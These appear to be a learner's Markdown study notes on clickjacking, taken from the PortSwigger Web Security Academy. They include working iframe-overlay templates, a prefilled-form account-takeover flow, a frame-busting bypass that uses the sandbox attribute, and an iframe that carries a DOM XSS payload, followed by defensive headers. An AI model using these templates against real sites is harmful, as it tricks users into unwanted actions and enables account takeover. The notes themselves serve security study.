# Clickjacking (UI Redressing)
**Source:** PortSwigger Web Security Academy
**Status:** ✅ Completed
**Date:** September 2026
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

## Table of Contents
1. [What is Clickjacking?](#what-is-clickjacking)
2. [How It Works](#how-it-works)
3. [Prefilled Form Attack](#prefilled-form-attack)
4. [Frame Busting Bypass](#frame-busting-bypass)
5. [Clickjacking + DOM XSS](#clickjacking--dom-xss)
6. [Multistep Clickjacking](#multistep-clickjacking)
7. [Prevention](#prevention)
8. [Quick Reference](#quick-reference)

---

## What is Clickjacking?

An interface-based attack where a user is tricked into clicking a hidden element on a real website by overlaying it with a fake decoy website.

**Key difference from CSRF:**

| | Clickjacking | CSRF |
|---|---|---|
| User interaction | ✅ Required (click) | ❌ Not required |
| How it works | Hidden iframe | Forged request |
| CSRF token stops it? | ❌ No | ✅ Yes |
| Happens in | Visible browser | Background |

---

## How It Works

**Basic structure:**

```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 128px;
      height: 128px;
      opacity: 0.00001;   /* invisible! */
      z-index: 2;          /* sits on top */
    }
    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;          /* sits below */
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    ...fake content...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

**Key CSS properties:**

```
opacity: 0.00001  → Makes iframe invisible to victim
z-index: 2        → iframe sits above decoy page
position          → absolute/relative ensures precise overlap
                    regardless of screen size or browser
```

**How victim gets tricked:**
1. Victim visits attacker's fake website
2. Sees "Click here to win prize!"
3. Clicks that text
4. Actually clicks invisible real button behind it
5. Real action executes on real website

> **Note:** Chrome 76+ has threshold-based transparency detection. Attackers tune opacity to avoid triggering it while keeping iframe invisible to humans.

**Tool:** Use **Burp Clickbandit** to automatically generate clickjacking attack pages — Burp menu → Clickbandit

---

## Prefilled Form Attack

Some websites allow GET parameters to pre-populate form fields:

```
Normal:   https://site.com/my-account
Modified: https://site.com/my-account?email=attacker@evil.com
```

When the modified URL loads — the email field is pre-filled with the attacker's email. Victim just needs to click Submit.

**Attack flow:**
1. Find form that accepts GET parameters
2. Pre-fill with attacker's values via URL
3. Frame this URL in invisible iframe
4. Align Submit button with decoy click target
5. Victim clicks → form submits → account compromised

**Finding field names:** Use browser DevTools → Inspect element on the form field → find `name` attribute

---

## Frame Busting Bypass

Frame busting = JavaScript that prevents a page from being loaded in an iframe.

**Common frame buster checks:**
- Is current window the top window?
- Are all frames visible?
- Intercept and flag suspicious framing?

**Bypass — HTML5 sandbox attribute:**

```html
<iframe src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

- `sandbox="allow-forms"` → allows form submission
- Omitting `allow-top-navigation` → disables frame buster scripts
- Frame buster can't check if it's the top window → neutralized

```html
<!-- Also works with scripts -->
<iframe src="https://victim-website.com" sandbox="allow-scripts allow-forms"></iframe>
```

---

## Clickjacking + DOM XSS

Combining clickjacking with DOM XSS dramatically increases impact:

**Steps:**
1. Find DOM XSS vulnerability on target site
2. Craft XSS payload URL
3. Frame that URL in invisible iframe
4. Victim clicks decoy → XSS executes

**Example:**
```html
<iframe src="https://vulnerable-site.com/feedback?name=
<img src=x onerror=print()>
&email=test@test.com&subject=test&message=test#feedbackResult">
</iframe>
```

**Impact:** Session hijacking, credential theft, arbitrary JS execution — all from a single click.

---

## Multistep Clickjacking

For actions requiring multiple clicks (add to cart → confirm, delete → confirm):

**Attack flow:**
```
Decoy page:              Real invisible page:
"Click me first!"    →   "Add to cart" button
"Click me next!"     →   "Confirm order" button
```

Requires precise CSS alignment for each step. Multiple iframes or positioned divs used for each required click.

---

## Prevention

### X-Frame-Options Header

```
X-Frame-Options: deny
```
Nobody can frame this page.

```
X-Frame-Options: sameorigin
```
Only same origin can frame this page.

```
X-Frame-Options: allow-from https://trusted-site.com
```
Only named site can frame this page.

> ⚠️ `allow-from` not supported in Chrome 76+ or Safari 12

---

### Content Security Policy — frame-ancestors

Modern replacement for X-Frame-Options:

```
Content-Security-Policy: frame-ancestors 'none';
```
Nobody can frame this page — same as X-Frame-Options: deny

```
Content-Security-Policy: frame-ancestors 'self';
```
Only same origin can frame — same as X-Frame-Options: sameorigin

```
Content-Security-Policy: frame-ancestors normal-website.com;
```
Only named website can frame.

> ✅ CSP preferred over X-Frame-Options — more flexible and better browser support

---

## Quick Reference

```
ATTACK STRUCTURE
Decoy page  → z-index: 1  (victim sees this)
iframe      → z-index: 2  (victim clicks this)
             opacity: ~0  (invisible)

FRAME BUSTING BYPASS
<iframe sandbox="allow-forms"></iframe>

PREVENTION HEADERS
X-Frame-Options: deny
Content-Security-Policy: frame-ancestors 'none';

TOOL
Burp Suite → Burp menu → Clickbandit

PREFILLED FORM
?fieldname=attacker_value in URL
```

---

*Notes by [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py) | PortSwigger Web Security Academy*
